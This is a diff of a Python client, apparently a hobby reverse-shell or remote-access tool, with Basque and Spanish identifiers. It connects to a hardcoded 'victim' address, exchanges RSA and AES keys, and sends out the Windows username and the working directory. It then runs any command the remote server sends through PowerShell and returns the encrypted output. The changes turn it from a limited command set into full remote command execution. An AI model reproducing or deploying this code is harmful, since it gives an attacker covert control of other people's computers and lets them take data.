@@ -2,9 +2,15 @@ import socket
 import time
 import zlib
 import pickle
+import win32api
 import os
+import subprocess
+import json
+import binascii
+import asyncio
 from fitxategiak.fitxa import bialketa
 from fitxategiak.asimetric import asime
+from fitxategiak.aesencrypt import aesenc
 
 
 
@@ -16,15 +22,8 @@ class bezeroa(object):
             self.so.connect((ip_biktima,portua))
             self.GPG = asime(".")
             self.GPG.Generastekey("cliente")
-            print("""
-            #  $                  &&&&&&
-            # ##                 &&0000&&
-            ####################&&&0000&&&
-            ####################&&&0000&&&
-                                 &&0000&&
-                                  &&&&&& 
-            RSA
-            """)
+            self.encriAes = None
+            self.decriptAes = None
         except (ConnectionRefusedError):
            print("none server")
 
@@ -47,15 +46,83 @@ class bezeroa(object):
         self.GPG.loadPublic("pUserver.pem")
         os.chdir("../prybate")
         self.GPG.loadPrymari("prybate.pem")
+        os.chdir("../../")
+        self.GPG.delete()
+       
+   
+     
+    def Aeskeyload(self):
+        key = binascii.hexlify(os.urandom(32))
+        iv = binascii.hexlify(os.urandom(16))
+        decriAes = {}
+        decriAes["key"] = str(key,encoding='utf-8')
+        decriAes["iv"] = str(iv,encoding='utf-8')
+        strDecriAes = json.dumps(decriAes)
+        bytDecriAes = bytes(strDecriAes,encoding='utf-8')
+        self.decriptAes = aesenc(binascii.unhexlify(bytes(decriAes["key"],encoding='utf-8')),binascii.unhexlify(bytes(decriAes["iv"],encoding='utf-8')))
+        EncdecriAes = self.GPG.encrypted(bytDecriAes)
+        self.so.send(EncdecriAes)
+        EnencriAes = self.so.recv(1024)
+        DeencriAes = str(self.GPG.decrypt(EnencriAes),encoding='utf-8')
+        encriAes = json.loads(DeencriAes)
+        self.encriAes = aesenc(binascii.unhexlify(bytes(encriAes['key'],encoding='utf-8')),binascii.unhexlify(bytes(encriAes['iv'],encoding='utf-8')))
+        
+    
+    def buffLengP(self,data):
+         leng = len(data)
+         Slen = str(leng)
+         Blen = bytes(Slen,encoding='utf-8')
+         self.so.send(self.encriAes.encript(Blen))
+         self.so.recv(1024)
+
 
     def comandLIne(self):
-        recibido = self.so.recv(4095)# ruta aktuala jasokodu (4095) bytes
-        recibidoDEc = self.GPG.decrypt(recibido)
-        url = str(recibidoDEc,encoding='utf-8')#ruta aktuala string modura pasako du
-        mezua  = input(url + ">")
-        mezuaENc = self.GPG.encrypted(bytes(mezua,encoding='utf-8'))
-        self.so.send(mezuaENc)
-        return mezua
+        user = win32api.GetUserName()
+        url = os.getcwd()#ruta aktuala 
+        ruter = bytes(user+"@"+url,encoding='utf-8') 
+        ruterENC = self.encriAes.encript(ruter)
+        self.buffLengP(ruterENC)
+        self.so.send(ruterENC)
+        comand = self.so.recv(2024)
+        comandDEC = str(self.decriptAes.decript(comand),encoding='utf-8')
+        return comandDEC
+
+
+
+        #recibido = self.so.recv(4095)# ruta aktuala jasokodu (4095) bytes
+        #recibidoDEc = self.GPG.decrypt(recibido)
+        #url = str(recibidoDEc,encoding='utf-8')#ruta aktuala string modura pasako du
+        #mezua  = input(url + ">")
+        #mezuaENc = self.GPG.encrypted(bytes(mezua,encoding='utf-8'))
+        #self.so.send(mezuaENc)
+        #return mezua
+
+        #user = win32api.GetUserName()
+        #url = os.getcwd()#ruta aktuala 
+        #ruter = bytes(user+"@"+url,encoding='utf-8') 
+        #ruterENC = self.GPG.encrypted(ruter)
+        #self.so.send(ruterENC)
+        #self.so.recv(4095)
+    
+    def cmdGlobal(self,cmd,sistem):
+        print(cmd)
+        if sistem == "nt":
+            result = subprocess.run(["powershell", "-Command", cmd], capture_output=True, text=True)
+            if result.stderr:
+                print("lengggg:")
+                print(len(result.stderr))
+                enResult = self.encriAes.encript(bytes(result.stderr,encoding='utf-8'))
+                self.buffLengP(enResult)
+                self.so.send(enResult) 
+            if result.stdout:
+                print("lengggg:")
+                enResult = self.encriAes.encript(bytes(result.stdout,encoding='utf-8'))   
+                self.buffLengP(enResult)
+                self.so.send(enResult)
+            else:
+                enResult = self.encriAes.encript(bytes("ok",encoding='utf-8'))
+                self.buffLengP(enResult)
+                self.so.send(enResult)   
     
     def windows_Com(self):
         cmd = self.so.recv(1024) 
@@ -117,32 +184,27 @@ class bezeroa(object):
 
 
 
-bezeroa = bezeroa("192.168.0.16",9999)
+bezeroa = bezeroa("192.168.1.137",9999)
 bezeroa.postPuKey()
 bezeroa.getPuKey()
 bezeroa.keysLoad()
+bezeroa.Aeskeyload()
 
 while True:
    comand = bezeroa.comandLIne()
-   Com_ALL = ["dir","systeminfo"]
-   #try:
-   inf = Com_ALL.index(comand)
-   windows_Com = ["dir","systeminfo"]
-   Balue = None
-   y = 0
-   for x in windows_Com :
-        print(x)
-        if x == comand and Balue == None:
-            Balue = 0
-        y += 1 
-   print(Balue)                                     
-   switcher = { 
-        0: bezeroa.windows_Com(), 
-        1: "one", 
-        2: "two", 
-   }
-   switcher.get(Balue)
-   #except(ValueError):
-   #     bezeroa.comand_Error() 
-
-
+   if len(comand) != 1 or comand == "h":
+        comdaExe = comand.split(" ")
+        arrComad = []
+        for fd in comdaExe:
+            if fd != "":
+                arrComad.append(fd)
+        if arrComad[0] == "cd":
+            print("cd")
+            print(arrComad)
+            drives = win32api.GetLogicalDriveStrings()
+            print(drives)
+            os.chdir("/users")
+        if arrComad[0] == "exit":
+            break
+        else:
+            bezeroa.cmdGlobal(comand,os.name)
